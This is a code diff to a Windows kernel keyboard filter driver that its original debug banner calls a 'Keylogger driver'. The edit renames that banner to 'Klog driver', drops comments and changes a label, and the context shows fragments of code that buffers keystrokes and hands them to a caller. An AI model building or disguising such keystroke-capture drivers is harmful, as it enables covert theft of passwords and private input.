@@ -12,7 +12,7 @@ KEYBOARD_INPUT_BUFFER   keyboardInputBuffer = {0};
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
                      IN PUNICODE_STRING RegistryPath)
 {
-    DebugPrintInfo("Keylogger driver. Built %s %s\n", __DATE__, __TIME__);
+    DebugPrintInfo("Klog driver. Built %s %s\n", __DATE__, __TIME__);
 
     WDF_DRIVER_CONFIG   config;
     NTSTATUS            status;
@@ -60,12 +60,6 @@ NTSTATUS Klog_EvtDeviceAdd(IN WDFDRIVER Driver,
 
     WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig,
                                            WdfIoQueueDispatchParallel);
-    
-    //
-    // Framework by default creates non-power managed queues for
-    // filter drivers.
-    //
-    
     ioQueueConfig.EvtIoInternalDeviceControl = Klog_EvtIoInternalDeviceControl;    
     status = WdfIoQueueCreate(device, &ioQueueConfig,
                               WDF_NO_OBJECT_ATTRIBUTES,
@@ -77,7 +71,6 @@ NTSTATUS Klog_EvtDeviceAdd(IN WDFDRIVER Driver,
 
     WDF_IO_QUEUE_CONFIG_INIT(&ioQueueConfig,
                              WdfIoQueueDispatchParallel);
-
     ioQueueConfig.EvtIoDeviceControl = Klog_EvtIoDeviceControlFromRawPdo;
     status = WdfIoQueueCreate(device, &ioQueueConfig,
                               WDF_NO_OBJECT_ATTRIBUTES,
@@ -357,7 +350,7 @@ NTSTATUS ReadKeyboardInputDataFromBuffer(OUT WDFMEMORY Destination, OUT size_t* 
     
     size_t bytesToRead = keyboardInputBuffer.Tail * sizeOfOneInputDataEntry;
     if (bytesToRead <= 0) {
-        goto Exit;
+        goto exit;
     }
 
     status = WdfMemoryCopyFromBuffer(Destination, 0, 
@@ -370,7 +363,7 @@ NTSTATUS ReadKeyboardInputDataFromBuffer(OUT WDFMEMORY Destination, OUT size_t* 
         DebugPrintError("WdfMemoryCopyFromBuffer failed. Status code 0x%X\n", status)
     }
 
-Exit:
+exit:
     WdfSpinLockRelease(keyboardInputBuffer.SpinLock);
     return status;
 }
